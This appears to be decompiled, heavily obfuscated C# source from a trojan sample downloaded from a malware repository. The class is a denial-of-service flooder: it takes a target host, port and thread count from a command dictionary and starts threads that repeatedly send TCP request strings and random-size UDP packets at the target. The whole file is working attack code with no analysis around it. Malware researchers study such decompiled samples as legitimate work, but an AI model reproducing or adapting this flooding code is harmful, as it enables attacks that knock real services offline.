// Decompiled with JetBrains decompiler
// Type: @Ԉ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;

internal sealed class \u0040Ԉ : \u0040Ӡ
{
  private readonly object \u0040ӓ;
  private readonly int \u0040Ӕ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public string \u0038k7() => (string) this.\u0040ӓ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public int \u0033h7() => this.\u0040Ӕ;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0040Ԉ(string _param1, string _param2, \u0040Ԫ _param3)
  {
    int num1;
    if (\u0040Ԉ.\u0040ӛ())
    {
      num1 = 3;
      goto label_6;
    }
    else
    {
      num1 = 2;
      if (\u0040Ԉ.\u0040ӛ())
        goto label_6;
    }
label_5:
    \u0040Ԉ.\u0040Ӗ((object) this);
    goto label_8;
label_6:
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 3:
          goto label_2;
        case 1:
        case 2:
          goto label_5;
        case 4:
          goto label_8;
        default:
          num1 = 4;
          continue;
      }
    }
label_2:
    \u0040Ԉ.\u0040ӕ();
    goto label_5;
label_8:
    try
    {
      \u0040Ԉ.\u0040ӓ ӓ = new \u0040Ԉ.\u0040ӓ();
      ӓ.\u0040ӓ = _param2.\u0040ӗ<Dictionary<string, string>>();
      int num2 = 8;
label_23:
      while (true)
      {
        int num3;
        ThreadStart threadStart;
        bool flag;
        int num4;
        object start1;
        object start2;
        object start3;
        switch (num2)
        {
          case 0:
label_20:
            ӓ.\u0040ӕ = (object) (threadStart = new ThreadStart(ӓ.\u0040Ә));
            num2 = 3;
            continue;
          case 1:
label_28:
            num4 = \u0040Ԉ.\u0040Ә((object) ӓ.\u0040ӓ[(string) \u0040Ԉ.\u0040ӗ(3626)]);
            num2 = 10;
            continue;
          case 2:
            start1 = ӓ.\u0040ӗ;
            if (start1 == null)
            {
              if (\u0040Ԉ.\u0040ӛ())
              {
                num2 = 5;
                continue;
              }
              goto case 3;
            }
            else
              goto label_26;
          case 3:
            start2 = (object) threadStart;
            break;
          case 4:
            ӓ.\u0040Ӗ = (object) (threadStart = new ThreadStart(ӓ.\u0040ә));
            goto case 16;
          case 5:
            ӓ.\u0040ӗ = (object) (threadStart = new ThreadStart(ӓ.\u0040Ӛ));
            if (!\u0040Ԉ.\u0040Ӝ())
            {
              num2 = 7;
              continue;
            }
            goto case 10;
          case 6:
          case 14:
            flag = num3 < num4;
            num2 = 13;
            continue;
          case 7:
            start1 = (object) threadStart;
            goto label_26;
          case 8:
            ӓ.\u0040Ӕ = \u0040Ԉ.\u0040Ә((object) ӓ.\u0040ӓ[(string) \u0040Ԉ.\u0040ӗ(3606)]);
            num2 = 1;
            continue;
          case 9:
          case 15:
            this.\u0040Ӕ = 0;
            if (true)
            {
              num2 = 18;
              continue;
            }
            goto case 4;
          case 10:
            num3 = 0;
            if (\u0040Ԉ.\u0040ӛ())
            {
              num2 = 6;
              continue;
            }
            goto case 6;
          case 11:
label_34:
            object ӗ = ӓ.\u0040Ӗ;
            if (ӗ != null)
            {
              start3 = ӗ;
              goto label_33;
            }
            else
            {
              num2 = 4;
              continue;
            }
          case 12:
          case 17:
            ++num3;
            num2 = 14;
            continue;
          case 13:
            while (flag)
            {
              object ӕ = ӓ.\u0040ӕ;
              if (ӕ != null)
              {
                start2 = ӕ;
                goto label_14;
              }
              else if (!\u0040Ԉ.\u0040Ӝ())
              {
                num2 = 0;
                goto label_23;
              }
            }
            goto case 9;
          case 16:
            start3 = (object) threadStart;
            goto label_33;
          case 18:
            goto label_18;
          default:
            num2 = 16;
            continue;
        }
label_14:
        \u0040Ԉ.\u0040ә((object) new Thread((ThreadStart) start2));
        num2 = 11;
        continue;
label_26:
        \u0040Ԉ.\u0040ә((object) new Thread((ThreadStart) start1));
        \u0040Ԉ.\u0040ӛ();
        if (\u0040Ԉ.\u0040Ӝ())
        {
          if (true)
          {
            num2 = 9;
            continue;
          }
          goto label_20;
        }
        else
        {
          if (\u0040Ԉ.\u0040ӛ())
          {
            num2 = 17;
            continue;
          }
          goto label_28;
        }
label_33:
        \u0040Ԉ.\u0040ә((object) new Thread((ThreadStart) start3));
        if (true)
          num2 = 2;
        else
          goto label_34;
      }
label_18:;
    }
    catch (Exception ex)
    {
      this.\u0040ӓ = \u0040Ԉ.\u0040Ӛ((object) ex);
      this.\u0040Ӕ = 1;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӕ() => \u0040ո.\u0040Ӕ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӗ(object _param0) => _param0.\u002Ector();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӗ(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int \u0040Ә(object _param0) => Convert.ToInt32((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ә(object _param0) => ((Thread) _param0).Start();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӛ(object _param0) => (object) ((Exception) _param0).Message;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӛ() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӝ() => false;

  private sealed class \u0040ӓ
  {
    public Dictionary<string, string> \u0040ӓ;
    public int \u0040Ӕ;
    public object \u0040ӕ;
    public object \u0040Ӗ;
    public object \u0040ӗ;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public \u0040ӓ()
    {
      \u0040Ԉ.\u0040ӓ.\u0040ӛ();
      \u0040Ԉ.\u0040ӓ.\u0040Ӝ((object) this);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040Ә()
    {
      \u0040Ԉ.\u0040ӓ.\u0040Ӟ();
      int num1;
      if (\u0040Ԉ.\u0040ӓ.\u0040ӝ())
      {
        if (true)
        {
          num1 = 5;
          goto label_11;
        }
      }
      else
        goto label_17;
label_2:
      int num2;
      bool flag = num2 < this.\u0040Ӕ;
      num1 = 3;
label_11:
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 5:
            goto label_15;
          case 1:
          case 2:
          case 6:
            goto label_2;
          case 3:
            if (flag)
            {
              try
              {
                TcpClient tcpClient = new TcpClient(this.\u0040ӓ[(string) \u0040Ԉ.\u0040ӓ.\u0040ӟ(3644)], \u0040Ԉ.\u0040ӓ.\u0040Ӡ((object) this.\u0040ӓ[(string) \u0040Ԉ.\u0040ӓ.\u0040ӟ(3656)]));
                int num3 = !\u0040Ԉ.\u0040ӓ.\u0040ӝ() ? 1 : 4;
                while (true)
                {
                  byte[] numArray;
                  string str;
                  switch (num3)
                  {
                    case 0:
                    case 4:
                      str = (string) \u0040Ԉ.\u0040ӓ.\u0040ӡ((object) new string[5]
                      {
                        (string) \u0040Ԉ.\u0040ӓ.\u0040ӟ(3668),
                        this.\u0040ӓ[(string) \u0040Ԉ.\u0040ӓ.\u0040ӟ(3644)],
                        (string) \u0040Ԉ.\u0040ӓ.\u0040ӟ(3718),
                        \u0040ԝ.\u0040\u0606(),
                        (string) \u0040Ԉ.\u0040ӓ.\u0040ӟ(3898)
                      });
                      int num4 = 3;
                      num3 = \u0040Ԉ.\u0040ӓ.\u0040Ӟ() ? num4 : num4;
                      continue;
                    case 3:
                      numArray = (byte[]) \u0040Ԉ.\u0040ӓ.\u0040ӣ(\u0040Ԉ.\u0040ӓ.\u0040Ӣ(), (object) str);
                      break;
                    case 5:
                      goto label_9;
                  }
                  \u0040Ԉ.\u0040ӓ.\u0040ӥ(\u0040Ԉ.\u0040ӓ.\u0040Ӥ((object) tcpClient), (object) numArray, 0, numArray.Length, SocketFlags.None);
                  num3 = 5;
                }
              }
              catch
              {
              }
label_9:
              \u0040Ԉ.\u0040ӓ.\u0040Ӧ(100);
              num1 = 4;
              continue;
            }
            num1 = 7;
            continue;
          case 4:
            goto label_10;
          case 7:
            goto label_16;
          default:
            num1 = 2;
            continue;
        }
      }
label_10:
      ++num2;
      goto label_2;
label_16:
      return;
label_15:
      num2 = 0;
      goto label_2;
label_17:
      num1 = 6;
      goto label_11;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040ә()
    {
      \u0040Ԉ.\u0040ӓ.\u0040Ӟ();
      int num1 = !\u0040Ԉ.\u0040ӓ.\u0040ӝ() ? 3 : 8;
      while (true)
      {
        int num2;
        bool flag;
        IPEndPoint ipEndPoint;
        Socket socket;
        switch (num1)
        {
          case 0:
          case 8:
            ipEndPoint = new IPEndPoint((IPAddress) \u0040Ԉ.\u0040ӓ.\u0040ӧ((object) this.\u0040ӓ[(string) \u0040Ԉ.\u0040ӓ.\u0040ӟ(3644)]), \u0040Ԉ.\u0040ӓ.\u0040Ӡ((object) this.\u0040ӓ[(string) \u0040Ԉ.\u0040ӓ.\u0040ӟ(3656)]));
            num1 = 7;
            continue;
          case 1:
          case 5:
            flag = num2 < this.\u0040Ӕ;
            num1 = 6;
            continue;
          case 2:
            num2 = 0;
            if (true)
            {
              num1 = 1;
              continue;
            }
            goto case 6;
          case 6:
            if (!flag)
            {
              num1 = 9;
              continue;
            }
            try
            {
              \u0040Ԉ.\u0040ӓ.\u0040Ө((object) socket, (object) new byte[\u0040ԝ.\u0040ڥ(new \u0040ԣ()) % 1000 + 1], (object) ipEndPoint);
            }
            catch
            {
            }
            \u0040Ԉ.\u0040ӓ.\u0040Ӧ(100);
            break;
          case 7:
            socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            num1 = 2;
            continue;
          case 9:
            goto label_12;
        }
        ++num2;
        num1 = 5;
      }
label_12:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040Ӛ()
    {
      int num1 = 5;
      IPEndPoint ipEndPoint;
      int num2;
      Socket socket;
      bool flag;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
            socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Tcp);
            num1 = 7;
            continue;
          case 2:
          case 4:
            flag = num2 < this.\u0040Ӕ;
            goto case 6;
          case 3:
            ++num2;
            num1 = 2;
            continue;
          case 5:
            ipEndPoint = new IPEndPoint((IPAddress) \u0040Ԉ.\u0040ӓ.\u0040ӧ((object) this.\u0040ӓ[(string) \u0040Ԉ.\u0040ӓ.\u0040ӟ(3644)]), \u0040Ԉ.\u0040ӓ.\u0040Ӡ((object) this.\u0040ӓ[(string) \u0040Ԉ.\u0040ӓ.\u0040ӟ(3656)]));
            if (\u0040Ԉ.\u0040ӓ.\u0040ӝ())
            {
              if (\u0040Ԉ.\u0040ӓ.\u0040ӝ())
              {
                num1 = 0;
                continue;
              }
              goto case 7;
            }
            else
            {
              num1 = 8;
              continue;
            }
          case 6:
          case 8:
            if (flag)
            {
              try
              {
                \u0040Ԉ.\u0040ӓ.\u0040Ө((object) socket, (object) new byte[\u0040ԝ.\u0040ڥ(new \u0040ԣ()) % 1000 + 1], (object) ipEndPoint);
              }
              catch
              {
              }
              \u0040Ԉ.\u0040ӓ.\u0040Ӧ(100);
              goto case 3;
            }
            else
            {
              num1 = 9;
              continue;
            }
          case 7:
            num2 = 0;
            num1 = 4;
            continue;
          case 9:
            goto label_10;
          default:
            int num3 = 3;
            num1 = \u0040Ԉ.\u0040ӓ.\u0040Ӟ() ? num3 : num3;
            continue;
        }
      }
label_10:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ӛ() => \u0040ո.\u0040Ӕ();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӝ(object _param0) => _param0.\u002Ector();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040ӝ() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040Ӟ() => false;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ӟ(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static int \u0040Ӡ(object _param0) => Convert.ToInt32((string) _param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ӡ(object _param0) => (object) string.Concat((string[]) _param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040Ӣ() => (object) Encoding.UTF8;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ӣ(object _param0, object _param1) => (object) ((Encoding) _param0).GetBytes((string) _param1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040Ӥ(object _param0) => (object) ((TcpClient) _param0).Client;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static int \u0040ӥ(
      object _param0,
      object _param1,
      int _param2,
      int _param3,
      SocketFlags _param4)
    {
      return ((Socket) _param0).Send((byte[]) _param1, _param2, _param3, _param4);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӧ(int _param0) => Thread.Sleep(_param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ӧ(object _param0) => (object) IPAddress.Parse((string) _param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static int \u0040Ө(object _param0, object _param1, object _param2) => ((Socket) _param0).SendTo((byte[]) _param1, (EndPoint) _param2);
  }
}
